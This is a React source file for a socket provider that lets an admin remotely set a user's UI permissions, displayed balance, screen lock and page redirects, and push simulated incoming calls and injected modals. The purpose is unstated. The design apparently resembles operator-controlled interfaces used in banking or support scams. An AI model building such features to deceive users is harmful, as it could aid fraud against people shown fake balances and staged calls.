import React, { useEffect, useContext } from 'react';
import useOrchestratorStore from '../store/orchestratorStore';
import socket from '../services/socketService';

// Create a context (though we are using zustand, we can still use context for the socket)
const SocketContext = React.createContext();

export const SocketProvider = ({ children }) => {
  useEffect(() => {
    // Listen for UI_PERMISSIONS
    socket.on('UI_PERMISSIONS', (permissions) => {
      useOrchestratorStore.getState().setUiPermissions(permissions);
    });

    // Listen for UPDATE_BALANCE
    socket.on('UPDATE_BALANCE', (balance) => {
      useOrchestratorStore.getState().setBalance(balance);
    });

    // Listen for UI_LOCK
    socket.on('UI_LOCK', (uiLock) => {
      useOrchestratorStore.getState().setUiLock(uiLock);
    });

    // Listen for FORCE_REDIRECT
    socket.on('FORCE_REDIRECT', (path) => {
      useOrchestratorStore.getState().setForceRedirectPath(path);
    });

    // Listen for TRIGGER_CALL (admin initiates simulated call)
    socket.on('TRIGGER_CALL', (callData) => {
      useOrchestratorStore.getState().setCallState({
        ...callData,
        callId: callData.callId || 'call_' + Date.now(),
        step: 'ringing',
      });
    });

    // Listen for CALL_ENDED (admin ends call)
    socket.on('CALL_ENDED', () => {
      useOrchestratorStore.getState().setCallState(null);
    });

    // Listen for show_modal (admin injects modal)
    socket.on('show_modal', (modalData) => {
      useOrchestratorStore.getState().setModalData(modalData);
    });

    // Cleanup
    return () => {
      socket.off('UI_PERMISSIONS');
      socket.off('UPDATE_BALANCE');
      socket.off('UI_LOCK');
      socket.off('FORCE_REDIRECT');
      socket.off('TRIGGER_CALL');
      socket.off('CALL_ENDED');
      socket.off('show_modal');
    };
  }, []);

  // We can also expose the socket if needed, but for now we just use the store
  return (
    <SocketContext.Provider value={{ socket }}>
      {children}
    </SocketContext.Provider>
  );
};

export const useSocket = () => {
  const context = useContext(SocketContext);
  if (!context) {
    throw new Error('useSocket must be used within a SocketProvider');
  }
  return context;
};